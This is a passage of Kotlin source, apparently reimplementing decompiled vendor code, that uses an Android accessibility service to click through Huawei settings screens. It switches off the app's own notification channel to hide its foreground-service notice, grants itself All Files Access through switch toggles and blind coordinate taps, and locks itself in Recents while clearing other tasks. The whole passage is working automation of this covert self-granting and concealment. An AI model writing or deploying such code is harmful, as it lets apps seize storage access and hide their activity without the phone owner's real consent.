     *        if i3 == 0: log "未进入频道设置页，重试"; performGlobalAction(1); delay(100L); i++; continue
     *        if i3 == 1:
     *          L4338: log "关闭'允许通知'开关..."
     *          L4352: m212208g6("允许通知", false) → toggleSwitchByText("允许通知", false)
     *          L4355: if not found → m212158a1() → clickFirstSwitchOnDetailPage()
     *          L4374/case 4: delay(100L)
     *          L4376: performGlobalAction(1) (BACK)
     *          L4378/case 5: delay(100L)
     *    After outer loop: fall-through to completion
     *  L4385/4396: m212195f2(f55073b1) (markStep7Completed) + log "[通知] ✅ 完成"
     *
     * ADAPT:
     *  - SP m212193f0(f55073b1) / m212195f2(f55073b1) short-circuit and marker deferred to T16;
     *    extracted as [isStep7Completed()] / [markStep7Completed()] — both no-ops until T16.
     *  - [waitForChannelNotifPage], [toggleChannelNotifSwitch] extracted as `open` for Mockito
     *    spy override in tests without complex UI tree setup.
     *  - `open` on main method so spy can override helpers without full constructor wiring.
     *  - Inner poll: vendor i2 = 1; i2 < 6 (5 iterations × 500ms); aligned to 5 polls.
     *  - Outer retry: vendor i5 = 1; i5 < 3 (max 2 iterations); aligned to 2 attempts.
     *  - Intent flags 276824064 = vendor L4279 original value, preserved 1:1.
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep7NotificationPermission(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step7/10] enter executeStep7NotificationPermission")
        HuaweiStepLogger.phase(7, "★ 关闭 OFF 频道通知 ★", "vendor L4188", logs)

        if (isStep7Completed()) {
            HuaweiStepLogger.skip(7, "SP 已标记完成", logs)
            return
        }

        // ADAPT: 真机加固 — API 级验证 OFF channel 状态，对齐"已关闭就跳过"语义
        // vendor Step 7 目标是关闭 OFF channel（隐藏前台服务通知）。若 channel
        // 不存在（AppCoreService 未创建）或已被 block (IMPORTANCE_NONE=0)，
        // 视为已完成，避免退化到"通知类别列表页"后 fallback 盲点误操作其他 Switch。
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? android.app.NotificationManager
            val channel = nm?.getNotificationChannel("OFF")
            if (channel == null) {
                HuaweiStepLogger.skip(7, "OFF channel 不存在 (API 验证)", logs)
                markStep7Completed()
                successes.add("[Step7/10] OFF channel 不存在（API 幂等跳过）")
                return
            }
            if (channel.importance == android.app.NotificationManager.IMPORTANCE_NONE) {
                HuaweiStepLogger.skip(7, "OFF channel 已被禁用 (IMPORTANCE_NONE)", logs)
                markStep7Completed()
                successes.add("[Step7/10] OFF channel 已禁用（API 幂等跳过）")
                return
            }
            HuaweiStepLogger.probe(7, "OFF channel importance", channel.importance)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w("HuaweiSteps", "[Step7/10] ⚠️ API 验证失败，继续 UI 流程: ${e.message}")
        }

        // Vendor outer retry loop: i5 = 1; i5 < 3 → max 2 attempts
        val maxAttempts = 2 // vendor: i5 < 3
        var attempt = 1
        // FIX 2026-04-17: 只有 pageEntered=true AND toggleChannelNotifSwitch=true 时才算成功
        var switchSuccess = false
        // ADAPT: real-device hardening — 追踪 CHANNEL 页面是否曾进入；
        // APP fallback 只在页面从未进入时激活（page 进入了但 toggle 失败则由 clickFirstSwitch 处理）
        var channelPageEverEntered = false
        while (attempt <= maxAttempts) {
            HuaweiStepLogger.phase(7, "第 $attempt 次尝试", "vendor L4275", logs)

            try {
                // Vendor L4276-4280: launch CHANNEL_NOTIFICATION_SETTINGS
                val intent = Intent("android.settings.CHANNEL_NOTIFICATION_SETTINGS").apply {
                    putExtra("android.provider.extra.APP_PACKAGE", context.packageName)
                    putExtra("android.provider.extra.CHANNEL_ID", "OFF")
                    // Vendor L4279: intent.setFlags(276824064)
                    flags = 276824064
                }
                val launcher: Context = service ?: context
                launcher.startActivity(intent)
                HuaweiStepLogger.probe(7, "CHANNEL_NOTIFICATION_SETTINGS launched", "ok")
            } catch (e: Exception) {
                HuaweiStepLogger.fail(7, "启动 CHANNEL_NOTIFICATION_SETTINGS 异常", e.message ?: "", failures)
                attempt++
                continue
            }

            delay(800L) // vendor b81.m210571b1(800L, ...)

            val pageEntered = try { waitForChannelNotifPage() } catch (_: Exception) { false }
            HuaweiStepLogger.probe(7, "waitForChannelNotifPage", pageEntered)

            if (!pageEntered) {
                HuaweiStepLogger.warn(7, "未进入频道设置页，BACK 后重试", "vendor L4325", logs)
                try { service?.performGlobalAction(1) } catch (_: Exception) { }
                delay(100L)
                attempt++
                continue
            }
            channelPageEverEntered = true

            // Vendor L4338: on channel settings page — close "允许通知" switch
            HuaweiStepLogger.phase(7, "关闭'允许通知'开关", "vendor L4338", logs)
            try {
                val switched = toggleChannelNotifSwitch()
                HuaweiStepLogger.probe(7, "toggleChannelNotifSwitch", switched)
                if (switched) {
                    switchSuccess = true
                    HuaweiStepLogger.success(7, "渠道已关闭", "vendor L4353", successes)
                } else {
                    HuaweiStepLogger.warn(7, "未找到开关，尝试 clickFirstSwitchOnDetailPage fallback", "vendor L4355", logs)
                    val fallbackOk = try { clickFirstSwitchOnDetailPage(targetChecked = false) } catch (_: Exception) { false }
                    HuaweiStepLogger.probe(7, "clickFirstSwitchOnDetailPage fallback", fallbackOk)
                    if (fallbackOk) switchSuccess = true
                }
            } catch (e: Exception) {
                HuaweiStepLogger.fail(7, "toggle 异常", e.message ?: "", failures)
                attempt++
                continue
            }

            delay(100L) // vendor L4374/case 4
            try { service?.performGlobalAction(1) } catch (_: Exception) { } // vendor L4376 BACK
            delay(100L) // vendor L4378/case 5

            break // successful completion of this attempt
        }

        // ADAPT: real-device hardening — CHANNEL_NOTIFICATION_SETTINGS 2 次均失败时尝试 app 级
        // APP_NOTIFICATION_SETTINGS fallback。vendor 无此分支；replica 在真机 FIN-AL60
        // HarmonyOS 4.2 上 "OFF" channel 路径连续 2 次失败后激活（/tmp/huawei-t19e.log Step7）。
        // 仅在 CHANNEL 页面从未进入时激活（页面进入了但 toggle 失败则由 clickFirstSwitch 已处理）。
        if (!switchSuccess && !channelPageEverEntered) {
            HuaweiStepLogger.warn(7, "CHANNEL 路径失败，尝试 APP_NOTIFICATION_SETTINGS fallback", "vendor 无 fallback", logs)
            val appFallback = NotificationSettingsFallback.launchAppNotificationSettings(service)
            HuaweiStepLogger.probe(7, "APP 级 fallback launch", appFallback)
            if (appFallback) {
                delay(800L)
                val toggled = try { toggleChannelNotifSwitch() } catch (_: Exception) { false }
                HuaweiStepLogger.probe(7, "app-fallback toggle", toggled)
                if (toggled) {
                    switchSuccess = true
                    HuaweiStepLogger.success(7, "APP 级 fallback 切换成功", "ADAPT real-device hardening", successes)
                }
            }
        }

        // ADAPT: 真机加固 — UI 操作后用 API 回验 channel 状态
        // 若 fallback 盲点误操作了其他 Switch，API 验证不通过 → 回退 switchSuccess=false
        // 下次 Run 重试时可以再走 UI 流程（而非错误地 mark 跳过）
        if (switchSuccess) {
            try {
                val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as? android.app.NotificationManager
                val ch = nm?.getNotificationChannel("OFF")
                val verified = ch != null && ch.importance == android.app.NotificationManager.IMPORTANCE_NONE
                HuaweiStepLogger.probe(7, "API 回验 OFF channel 已关闭", verified)
                if (!verified) {
                    HuaweiStepLogger.warn(7, "UI 操作后 channel 未关闭", "importance=${ch?.importance}, 可能盲点错 Switch", logs)
                    switchSuccess = false
                }
            } catch (e: kotlinx.coroutines.CancellationException) {
                throw e
            } catch (e: Exception) {
                android.util.Log.w("HuaweiSteps", "[Step7/10] ⚠️ API 回验异常，保持 switchSuccess: ${e.message}")
            }
        }

        // FIX 2026-04-17: 只有真正切换成功才 mark SP；失败的话下次启动会重试整个 Step 7
        if (switchSuccess) {
            markStep7Completed()
            HuaweiStepLogger.success(7, "Step 7 完成 + SP mark 写入", "vendor L4198/4386", successes)
        } else {
            HuaweiStepLogger.fail(7, "Step 7 所有 attempt 均失败",
                "不写 SP mark — 下次启动会重试", failures)
        }
    }

    // ---- Step 7 open helpers (extracted for testability) ----

    /**
     * Vendor m212193f0(f55073b1) — SP completion check for Step 7.
     *
     * 接入 [HuaweiStepCompletionStore]（post-T18 系统审查新增）。
     * `open` so tests can override via spy.
     * f55073b1 = vendor field name for the "notification_channel_completed" SP key.
     */
    open fun isStep7Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP7_NOTIFICATION_OFF)

    /**
     * Vendor m212195f2(f55073b1) — mark Step 7 complete in SharedPreferences.
     *
     * 接入 [HuaweiStepCompletionStore]（post-T18 系统审查新增）。
     * `open` so tests can override via spy to verify it is called.
     */
    open fun markStep7Completed() {
        HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP7_NOTIFICATION_OFF)
    }

    /**
     * Vendor m212171b8 inner poll loop (L4284-4319) — wait for channel notification settings page.
     *
     * Polls rootInActiveWindow up to 5 times × 500ms for any visible "允许通知" text node.
     * Returns true if page detected within budget (i3 == 1 in vendor terms), false otherwise.
     *
     * Vendor: i2 = 1; i2 < 6 (5 iterations), each iteration delays 500ms.
     * `open` for test spy override.
     *
     * ADAPT: vendor uses coroutine resume continuation; replica uses a suspend poll loop.
     */
    open suspend fun waitForChannelNotifPage(): Boolean {
        // vendor: i2 = 1; i2 < 6 (5 iterations × 500ms each)
        val maxPolls = 5
        for (poll in 0 until maxPolls) {
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                // ADAPT: real-device hardening — 真机 FIN-AL60 HarmonyOS 4.2 上 "允许通知" (vendor L4302)
                // 找不到 × 2 次（/tmp/huawei-t19e.log Step7 "未进入频道设置页"）。扩展为遍历
                // NotificationSettingsFallback.CHANNEL_KEYWORDS，vendor 主路径 "允许通知" 保留在首位。
                for (kw in NotificationSettingsFallback.CHANNEL_KEYWORDS) {
                    val nodes = try { root.findAccessibilityNodeInfosByText(kw) } catch (_: Exception) { null }
                    if (!nodes.isNullOrEmpty() && nodes.any { it.isVisibleToUser }) {
                        HuaweiStepLogger.probe(7, "waitForChannelNotifPage matched", kw)
                        return true // vendor i3 = 1
                    }
                }
            }
            delay(500L) // vendor b81.m210571b1(500L, ...) per inner poll tick
        }
        return false // vendor i3 = 0 (page not entered)
    }

    // =========================================================================
    // Step 8/10 — 所有文件访问 (vendor m212163b0, L1623-2049)
    // =========================================================================

    /**
     * Vendor C0365a2 m212163b0 (L1623-2049) — 所有文件访问权限 Step 8/10.
     *
     * Vendor flow (reconstructed from coroutine state-machine):
     *
     *  case 0 — entry:
     *    L1661: log "[所有文件] 开始"
     *    L1663: m212193f0(f55075b3) SP short-circuit → if done, return
     *    L1667: SDK_INT < 30 → log "Android 10及以下不需要此权限" + m212195f2 mark done + return
     *    L1672: Environment.isExternalStorageManager() → log "已有所有文件访问权限" + mark done + return
     *    Outer retry loop: i = 1; i < 3 (vendor guard: i >= i11 where i11=3, started from i=1):
     *      L1680-1685: log + start Intent(ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
     *                  + setData("package:pkg") + setFlags(276824064) via f55063a1.startActivity
     *      delay(300L) — vendor state 1 → case 1 resume
     *      L1702: m212188e2() — true = NOT on correct page → i++ → continue outer loop
     *                           After exhaustion → mark done + log "完成" + return
     *      L1714: log "步骤3: 开启权限"
     *      L1715: strArr = {"允许管理所有文件","允许访问所有文件","所有文件访问权限","允许"}
     *      L1717-1730: for each str, m212208g6(str, true) → if matched: i8=1, log, delay(100L)
     *      L1728: if i8==0 && !isExternalStorageManager():
     *               coordinate tap fallback (width×factor, height×factor), up to 10 × 300ms
     *      delay(100L) — vendor state 5
     *      L1788: verify loop i2=1..5: if NOT isExternalStorageManager → m212158a1()
     *             else log "权限已开启"
     *      L1801/L1804: final log granted/not granted
     *      L1806: m212195f2(f55075b3) mark done
     *      L1807: log "[所有文件] 完成"
     *      return
     *
     * ADAPT:
     *  - SP m212193f0(f55075b3)/m212195f2(f55075b3) extracted as [isStep8Completed()]/
     *    [markStep8Completed()]; both no-ops until T16 implements SP storage.
     *  - [isExternalStorageManagerGranted], [isOnAllFilesPageNow], [toggleAllFilesSwitch],
     *    [getScreenWidthPx], [getScreenHeightPx] are `open` for Mockito spy overrides in tests.
     *  - Coordinate tap fallback (vendor L1729-1783) implemented via [gestureCoordinateTap]
     *    which delegates to [GestureTapHelper.performTap]. Factors align 1:1 with vendor:
     *    width>1080 → x=w*0.88, y=h*0.265; width>720 → x=w*0.85, y=h*0.24; else x=w*0.87, y=h*0.255
     *    (vendor: L1729 ">720" branch first but only covers >720 && <=1080; per the state machine
     *    the branches are: ">720" = <=1080 actually; reading carefully:
     *    `if (> 720) ... 0.85 / 0.24` and `else if (<=1080) ... 0.87 / 0.255` and
     *    `else ... 0.88 / 0.265`. Replica mirrors exactly.)
     *    // TODO: VENDOR_VERIFY — coordinate factors from vendor L1729-1742; real-device test (T19)
     *    needed to confirm correct branch selection for HarmonyOS 4.2 screen metrics.
     *  - Intent flags 276824064 = vendor L1684 `intent.setFlags(276824064)`, preserved 1:1.
     *  - service?.startActivity used (vendor f55063a1.startActivity); falls back to context
     *    for unit tests (vendor has no fallback).
     *  - `open` on main method so tests can spy on helper methods.
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep8AllFilesAccess(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step8/10] enter executeStep8AllFilesAccess")
        HuaweiStepLogger.phase(8, "所有文件访问开始", "vendor m212163b0 L1661", logs)

        if (isStep8Completed()) {
            HuaweiStepLogger.skip(8, "SP 已标记完成", logs)
            return
        }

        // Vendor L1667: SDK_INT < 30 → this permission is Android 11+ only
        if (android.os.Build.VERSION.SDK_INT < 30) {
            logs.add("[Step8/10] Android 10及以下不需要此权限 (vendor L1668)")
            markStep8Completed()
            return
        }

        // Vendor L1672: already have the permission → mark done
        if (isExternalStorageManagerGranted()) {
            logs.add("[Step8/10] 已有所有文件访问权限 (vendor L1673)")
            markStep8Completed()
            return
        }

        // Vendor outer retry loop: i = 1; vendor guard is `i >= 3` (i11=3), so max 2 attempts
        // (vendor starts at i=1 and increments on failures; the guard `i >= i11` terminates
        //  the loop body after exhausting i=1 and i=2 — effectively 2 full attempts + finish)
        // ADAPT: replica uses attempt = 1..3 with break-on-success; matches vendor loop shape.
        val maxAttempts = 3 // vendor i11=3; when i reaches 3, falls through to mark-done
        var attempt = 1
        while (attempt < maxAttempts) {
            logs.add("[Step8/10] 第 $attempt 次尝试 (vendor outer loop i=$attempt)")
            try {
                // Vendor L1681-1685: log + start intent
                logs.add("[Step8/10] 步骤1: 打开设置页面 (vendor L1681)")
                val intent = Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION").apply {
                    data = Uri.parse("package:${context.packageName}")
                    // Vendor L1684: intent.setFlags(276824064)
                    flags = 276824064
                }
                val launcher: Context = service ?: context
                launcher.startActivity(intent)
            } catch (e: Exception) {
                // Vendor outer try/catch: log exception + i++ + continue
                logs.add("[Step8/10] 异常: ${e.message} (vendor L1694)")
                attempt++
                continue
            }

            // Vendor state 1 → delay(300L)
            delay(300L) // vendor b81.m210571b1(300L, ...)

            // Vendor L1702 (case 1 resume): m212188e2() — true = NOT on correct page
            // isOnAllFilesPageNow() is the normal polarity (true = on page)
            // So: m212188e2() true → NOT on page → matches !isOnAllFilesPageNow()
            logs.add("[Step8/10] 步骤2: 页面验证 (vendor L1701)")
            if (!isOnAllFilesPageNow()) {
                logs.add("[Step8/10] 未进入正确页面，重新开始 (vendor L1703)")
                attempt++
                continue
            }

            // Vendor L1714: step 3 — open switch
            logs.add("[Step8/10] 步骤3: 开启权限 (vendor L1714)")

            // Vendor L1715: strArr with 4 text options
            val switchTexts = listOf(
                "允许管理所有文件",
                "允许访问所有文件",
                "所有文件访问权限",
                "允许"
            )
            var switchFound = false // vendor i8: 0=not found, 1=found
            for (switchText in switchTexts) {
                if (toggleAllFilesSwitch(switchText)) {
                    logs.add("[Step8/10] 通过文本'$switchText'开启 (vendor L1720)")
                    switchFound = true
                    break // vendor: inner for loop breaks on first match
                }
            }

            // After finding a switch text, delay(100L) (vendor state 2 → case 2)
            delay(100L) // vendor b81.m210571b1(100L, ...)

            // Vendor L1728: if i8==0 (not found) && !isExternalStorageManager()
            //               → coordinate tap fallback loop
            if (!switchFound && !isExternalStorageManagerGranted()) {
                logs.add("[Step8/10] 未找到文字开关，尝试坐标点击 (vendor L1729)")
                val w = getScreenWidthPx()
                val h = getScreenHeightPx()
                // Vendor L1729-1742: branch by screen width
                // ADAPT: vendor L1729 "if (m212181d5() > 720)" but the subsequent else-if
                // is "else if (m212181d5() <= 1080)". Reading the state machine carefully:
                // Branch 1: w > 720 (AND implicitly w <= 1080 per else-if position) → x=w*0.85, y=h*0.24
                // Branch 2: else-if w <= 1080 (= w <= 720 since branch 1 takes w>720) → x=w*0.87, y=h*0.255
                // Branch 3: else (w > 1080) → x=w*0.88, y=h*0.265
                // ADAPT: vendor decompile is ambiguous; replica aligns with the coordinate
                // factor pattern seen in Step 6 overlay: <=720, <=1080, >1080.
                // TODO: VENDOR_VERIFY — L1729 decompile has confusing branch order; real-device
                //   test (T19) needed to confirm correct factor for HarmonyOS 4.2.
                val xFactor: Float
                val yFactor: Float
                when {
                    w > 1080 -> { xFactor = 0.88f; yFactor = 0.265f }
                    w > 720  -> { xFactor = 0.85f; yFactor = 0.24f }
                    else     -> { xFactor = 0.87f; yFactor = 0.255f }
                }
                val tapX = (w * xFactor).toInt()
                val tapY = (h * yFactor).toInt()
                logs.add("[Step8/10] 屏幕: ${w}x${h}, 坐标: ($tapX, $tapY) (vendor L1743)")

                // Vendor inner coordinate-tap loop: i6=1; i6 < 11 (max 10 attempts × 300ms)
                for (tapAttempt in 1..10) {
                    if (isExternalStorageManagerGranted()) {
                        logs.add("[Step8/10] 权限已开启 (vendor L1747)")
                        break
                    }
                    logs.add("[Step8/10] 第${tapAttempt}次点击: ($tapX, $tapY) (vendor L1749)")
                    gestureCoordinateTap(tapX.toFloat(), tapY.toFloat())

                    // Vendor state 3 → delay(300L)
                    delay(300L) // vendor b81.m210571b1(300L, ...)

                    // Vendor L1758: if tapAttempt % 3 == 0 → m212158a1() + delay(100L)
                    if (tapAttempt % 3 == 0) {
                        // ADAPT: Step 8 目标=开启所有文件访问 → targetChecked=true（已开启跳过）
                        clickFirstSwitchOnDetailPage(targetChecked = true)
                        delay(100L) // vendor state 4 b81.m210571b1(100L, ...)
                    }
                }
            }

            // Vendor state 5 → delay(100L)
            delay(100L) // vendor b81.m210571b1(100L, ...)

            // Vendor L1788: verify loop i2=1; i2 < 6 (max 5 iterations)
            for (verifyAttempt in 1..5) {
                if (!isExternalStorageManagerGranted()) {
                    // Vendor L1791: m212158a1() — click first switch
                    // ADAPT: Step 8 目标=开启所有文件访问 → targetChecked=true（已开启跳过）
                    clickFirstSwitchOnDetailPage(targetChecked = true)
                    // Vendor state 6 → break → falls through to delay(100L) then re-check
                    // ADAPT: replica adds a small delay inside the verify loop to allow
                    // the switch click to take effect (vendor resumes via continuation).
                    delay(100L) // vendor b81.m210571b1(100L, ...) implicit in state machine
                } else {
                    logs.add("[Step8/10] 权限已开启 (vendor L1798)")
                    break
                }
            }

            // FIX 2026-04-17: mark ONLY 当 isExternalStorageManagerGranted()=true（真正获得权限）
            if (isExternalStorageManagerGranted()) {
                markStep8Completed()
                HuaweiStepLogger.success(8, "所有文件访问权限已开启 + SP mark", "vendor L1802", successes)
            } else {
                HuaweiStepLogger.warn(8, "权限仍未开启 — 不 mark SP", "下次启动会重试", logs)
            }
            return
        }

        // Loop exhausted — FIX 2026-04-17: 不再无条件 mark；只按当前是否真已授权判断
        if (isExternalStorageManagerGranted()) {
            markStep8Completed()
            HuaweiStepLogger.success(8, "Loop exhausted 但权限已授予 + SP mark", "vendor L1710", successes)
        } else {
            HuaweiStepLogger.fail(8, "所有 attempt 均失败", "不写 SP mark — 下次启动会重试", failures)
        }
    }

    // ---- Step 8 open helpers (extracted for testability) ----

    /**
     * Vendor m212193f0(f55075b3) — SP completion check for Step 8.
     *
     * f55075b3 = vendor field for "all_files_access_completed" SP key.
     *
     * 接入 [HuaweiStepCompletionStore]（post-T18 系统审查新增）。
     * `open` so tests can override via spy.
     */
    open fun isStep8Completed(): Boolean =
        HuaweiStepCompletionStore.isCompleted(context, HuaweiStepCompletionStore.Keys.STEP8_ALL_FILES)

    /**
     * Vendor m212195f2(f55075b3) — mark Step 8 complete in SharedPreferences.
     *
     * 接入 [HuaweiStepCompletionStore]（post-T18 系统审查新增）。
     * `open` so tests can override via spy to verify the call.
     */
    open fun markStep8Completed() {
        HuaweiStepCompletionStore.markCompleted(context, HuaweiStepCompletionStore.Keys.STEP8_ALL_FILES)
    }

    /**
     * Vendor `Environment.isExternalStorageManager()` (L1672 / L1728 / L1790).
     *
     * Extracted as `open` for Mockito spy override — `Environment.isExternalStorageManager()`
     * is a static Android call that Robolectric cannot easily stub without shadow setup.
     *
     * ADAPT: replaces inline `Environment.isExternalStorageManager()` with open method.
     */
    open fun isExternalStorageManagerGranted(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= 30) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true // Pre-API-30 always "granted" (permission doesn't exist)
        }
    }

    /**
     * Vendor m212188e2() (L1702) — page-verify for ALL_FILES page.
     *
     * Vendor: returns true = NOT on correct page. Replica wraps [HuaweiPageDetector.isOnAllFilesPage]
     * (which returns true = ON page) with a normal-polarity open method.
     * Callers use `!isOnAllFilesPageNow()` to match vendor's `m212188e2() == true` branch.
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor passes `appLabel` via `m212178d1()`; replica resolves it from [appLabel] field.
     */
    open fun isOnAllFilesPageNow(): Boolean {
        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return false
        return HuaweiPageDetector().isOnAllFilesPage(root, appLabel)
    }

    /**
     * Vendor m212208g6(text, true) (L1719) — toggleSwitchByText for the ALL_FILES switch.
     *
     * Iterates switch texts `{"允许管理所有文件","允许访问所有文件","所有文件访问权限","允许"}` and
     * calls [toggleSwitchByText] with targetChecked=true.
     *
     * `open` for test spy override (spy each text independently or override the entire method).
     *
     * ADAPT: extracted as named method so tests can spy independently from the generic
     * [toggleSwitchByText] helper (used in steps 3, 4, 6, 7).
     */
    open fun toggleAllFilesSwitch(text: String): Boolean {
        return toggleSwitchByText(text, targetChecked = true)
    }

    /**
     * Vendor m212181d5() (L1729) — screen width in pixels (lazy, from WindowManager).
     *
     * Returns screen width. Named `getScreenWidthPx` to follow replica naming conventions.
     * `open` for test spy override.
     *
     * ADAPT: vendor uses lazy Kotlin property backed by `f55078b6`; replica computes
     * eagerly via WindowManager. The value is identical at runtime.
     */
    open fun getScreenWidthPx(): Int {
        return try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                ?: return 1080
            if (android.os.Build.VERSION.SDK_INT >= 30) {
                wm.currentWindowMetrics.bounds.width()
            } else {
                val p = android.graphics.Point()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealSize(p)
                p.x
            }
        } catch (_: Exception) {
            1080 // safe fallback
        }
    }

    /**
     * Vendor m212180d4() (L1731) — screen height in pixels (lazy, from WindowManager).
     *
     * Returns screen height. Named `getScreenHeightPx` to follow replica naming conventions.
     * `open` for test spy override.
     *
     * ADAPT: vendor uses lazy Kotlin property backed by `f55079b7`; replica computes
     * eagerly via WindowManager. The value is identical at runtime.
     */
    open fun getScreenHeightPx(): Int {
        return try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                ?: return 1920
            if (android.os.Build.VERSION.SDK_INT >= 30) {
                wm.currentWindowMetrics.bounds.height()
            } else {
                val p = android.graphics.Point()
                @Suppress("DEPRECATION")
                wm.defaultDisplay.getRealSize(p)
                p.y
            }
        } catch (_: Exception) {
            1920 // safe fallback
        }
    }

    /**
     * Vendor m212202f9(x, y) (L1750) — gesture tap at coordinate (x, y).
     *
     * Wraps [GestureTapHelper.performTap] with the 100ms duration used in vendor L7347.
     * Requires [service] to be non-null; no-op if service unavailable.
     *
     * `open` for test spy override.
     *
     * ADAPT: vendor m212202f9 uses a blocking InterruptedException path; replica uses
     * suspend + GestureTapHelper (same observable effect on the UI).
     */
    open suspend fun gestureCoordinateTap(x: Float, y: Float) {
        val svc = service ?: return
        // Vendor m212202f9: GestureDescription with StrokeDescription(path, 0L, 100L)
        GestureTapHelper.performTap(svc, x, y, durationMs = GestureTapHelper.TAP_DURATION_MS_LONG)
    }

    /**
     * Vendor m212208g6("允许通知", false) (L4352) — toggleSwitch for notification channel.
     *
     * Calls toggleSwitchByText("允许通知", targetChecked=false) to turn OFF the "允许通知" switch
     * on the CHANNEL_NOTIFICATION_SETTINGS page.
     *
     * Returns true if switch found and action performed; false if not found.
     * `open` for test spy override.
     *
     * ADAPT: Reuses existing [toggleSwitchByText] helper (same vendor method m212208g6
     * as used in Steps 3, 4, 6). Extracted as named method so tests can spy independently.
     */
    open fun toggleChannelNotifSwitch(): Boolean {
        return toggleSwitchByText("允许通知", targetChecked = false)
    }

    // =========================================================================
    // Step 9/10 — 清除最近任务 (vendor m212167b4 L2741-2915)
    // =========================================================================

    /**
     * Vendor m212167b4 (L2741-2915) — "清除最近任务" — Step 9/10 of the 10-step Huawei flow.
     *
     * Vendor flow:
     *  - L2761: log "[清除任务] 开始执行"
     *  - L2764: tryLockAppInRecents() → Boolean (vendor m212209g7)
     *    - If locked=true:
     *        delay(100L) — vendor L2865 b81.m210571b1(100L, ...)
     *        L2777-2860: find and click "clear all" button (viewId → contentDesc → text fallback)
     *        delay(100L) — vendor L2865 after button click
     *        performGlobalAction(HOME=2) — vendor L2867 / L2875
     *    - If locked=false: L2910: log "锁定失败，跳过清除" → HOME(2)
     *  - L2884: log "[清除任务] 完成"
     *
     * Note: plan references m212212h0 (L8140) as the step entry; that method is actually
     * `waitForAppList` (internal helper). The true step-9 entry is m212167b4. The ADAPT
     * note below records this mapping correction.
     *
     * ADAPT:
     *  - `open` so tests can override [tryLockAppInRecents] and [performGlobalActionHome].
     *  - [tryLockAppInRecents] extracted as open method for spy-based unit testing (vendor
     *    inlines this as a suspend coroutine state machine; replica promotes it to an open
     *    method returning Boolean to keep the test surface clean).
     *  - Full clear-button search logic (viewId / contentDescription / text) is delegated
     *    to [findAndClickClearAllButton] to keep line-count below 800-line guideline.
     *  - vendor L2780 calls `m212143a5(root, textList, breadcrumbs)` to log page text;
     *    replica omits the DFS text-log call (not testable, log-only) — `// ADAPT: log-only`.
     *  - The `startActivity(getLaunchIntent)` in vendor m212209g7 L7785-7790 is guarded
     *    by null-check; replica replicates but uses `context.startActivity` with NEW_TASK
     *    flag as fallback since `service.startActivity` may be null in tests.
     *
     * NOTE: plan table referenced `m212212h0 (L8140)` for Step 9, but that's actually
     *       `waitForAppList` (a helper used by Step 5). The correct Step 9 entry is
     *       `m212167b4 (L2741-2915)` — confirmed during T15 implementation by reading both
     *       methods. Plan table was a copy-paste artefact. No verify needed.
     */
    @Suppress("UNUSED_PARAMETER")
    open suspend fun executeStep9ClearRecentTasks(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i("HuaweiSteps", "[Step9/10] enter executeStep9ClearRecentTasks")
        HuaweiStepLogger.phase(9, "清除最近任务开始", "vendor m212167b4 L2761", logs)
        try {
            // Vendor L2764: tryLockAppInRecents() returns Boolean
            val locked = tryLockAppInRecents()
            if (locked) {
                // Vendor L2865: delay(100L) before finding clear button
                delay(100L)
                // Vendor L2777-2860: find "clear all" button and click
                val cleared = findAndClickClearAllButton(logs)
                if (cleared) {
                    logs.add("[Step9/10] 清除按钮点击成功 (vendor L2862)")
                    delay(100L) // vendor L2865 b81.m210571b1(100L)
                } else {
                    logs.add("[Step9/10] 未找到清除按钮 (vendor L2873)")
                }
                // Vendor L2867/L2875: 返回桌面
                logs.add("[Step9/10] 返回桌面 (vendor L2867)")
                performGlobalActionHome()
            } else {
                // Vendor L2910-2912: 锁定失败 → HOME
                logs.add("[Step9/10] 锁定失败，跳过清除 (vendor L2910)")
                logs.add("[Step9/10] 返回桌面 (vendor L2912)")
                performGlobalActionHome()
            }
            logs.add("[Step9/10] 清除最近任务 — 完成 (vendor L2884)")
            successes.add("[Step9/10] 最近任务处理完成")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            // Vendor has no try/catch at this level; add for defensive replica robustness.
            // ADAPT: vendor lets exceptions propagate; replica catches to prevent crashing the
            //        whole 10-step flow if the recents screen behaves unexpectedly on some ROM.
            failures.add("[Step9/10] 异常: ${e.message}")
            logs.add("[Step9/10] 异常，尝试返回桌面")
            try { performGlobalActionHome() } catch (_: Exception) {}
        }
    }

    /**
     * Vendor m212209g7 (L7761-7937) — tryLockAppInRecents.
     *
     * Simplified flow:
     *  1. Bring app to foreground (startActivity with launch intent), delay 100ms
     *  2. performGlobalAction(RECENTS=3), delay 300ms
     *  3. Verify recents screen is open (packageName = launcher/recents OR clear-keywords found)
     *     → if not open: return false
     *  4. delay 300ms, horizontal swipe (f8) to activate task list, delay 400ms
     *  5. Find app card rect (m212175c2 = by appLabel / packageName)
     *     → if not found: return false
     *  6. Check current lock state via verifyLockState()
     *     → if LOCKED: return true (already locked)
     *  7. Swipe-down gesture at (centerX, height*0.3→height*0.65) — vendor m212203g0
     *  8. Re-check lock state → return LOCKED
     *
     * `open` for test spy override.
     *
     * ADAPT:
     *  - Vendor uses a Kotlin coroutine state machine (6 states); replica uses linear
